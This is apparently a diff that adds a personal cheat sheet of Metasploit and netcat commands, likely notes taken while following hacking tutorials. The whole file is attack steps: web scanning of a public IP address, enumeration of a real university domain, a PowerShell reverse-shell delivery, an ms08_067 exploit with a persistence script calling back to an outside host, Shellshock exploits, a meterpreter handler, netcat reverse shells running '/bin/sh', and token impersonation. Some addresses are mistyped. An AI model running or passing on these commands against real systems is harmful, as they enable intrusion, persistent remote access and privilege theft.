@@ -1,0 +1,100 @@
+msfdb init
+service postgresql start
+msfconsole
+db_status
+load wmap
+?
+wmap_sites
+wmap_sites -a http://128.199.102.111
+wmap_sites -l http://128.199.102.111
+wmap_targets -t http://128.199.102.111
+wmap_targets -l http://128.199.102.111
+wmap_run -t
+wmap_vulns -l
+
+cd /usr/share/metasploit-framework/modules/
+cd auxiliary
+https://archive.org/web/
+msfconsole
+use auxiliary/scanner/http/enum_wayback
+set OUTFILE sans_wayback
+set DOMAIN stedwards.edu
+run
+more sans_wayback
+more sans_wayback | grep email
+more sans_wayback | grep nessus
+
+msfconsole
+use exploit/multi/script/web_delivery
+set LHOST 192.1681.153
+set LPORT 4444
+set URIPATH powersploit
+set target 2
+set payload windows/powershell_reverse_tcp
+sessions -l
+sessions -l 1
+PS C: \Users\OTW > Get-Process
+
+msfconsole
+use exploit ms08_067_netapi
+options
+run persistence -h
+run persistence –A –L c:\\ -X 30 –p 443 –r 128.199.102.111
+background
+sessions –i
+reboot
+
+search shellshock
+use auxiliary/server/dhclient/dhclient_bash_env
+info
+show options
+set SVRHOST 192.168.131.254
+set CMD /bin/nc -l -p6996 -e /bin/sh
+set NETMASK 255.255.255.0
+exploit
+c::\nc 192.168.131.129 6996
+ifconfig
+whoami
+
+msfconsole
+search shellshock
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+options
+set rhost 172.16.1.102
+set targeturi /cgi-bin/hello.sh
+show payloads
+set payload linux/x86/shell/reverse_tcp
+options
+check
+exploit
+
+cd /usr/share/metasploit-framework/scripts/resource
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_http
+set LHOST 192.168.181.128
+set LPORT 4444
+makerc handler_http.rc
+more handler_http.rc
+resource handler_http.rc
+exploit
+msfconsole -r handler_http.rc
+
+nc -l -p 1234
+nc 172.16.1.100 1234 -e /bin/sh
+nc -l -p 1234
+whoami
+www-data
+nc -l -p 1234
+whoami
+www-data
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+ps
+
+/usr/lib/cgi-bin 
+sudo nano hello.sh
+sudo chmod 755 hello.sh
+load incognito
+list_tokens -u
+impersonate_token 2K3TARGET\\OTW
